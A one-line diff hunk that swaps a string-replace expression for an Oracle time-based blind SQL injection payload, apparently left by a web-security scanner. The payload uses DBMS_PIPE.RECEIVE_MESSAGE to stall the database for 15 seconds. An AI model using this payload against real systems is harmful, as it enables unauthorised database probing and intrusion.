@@ -1,1 +1,1 @@
-"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")
+555'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
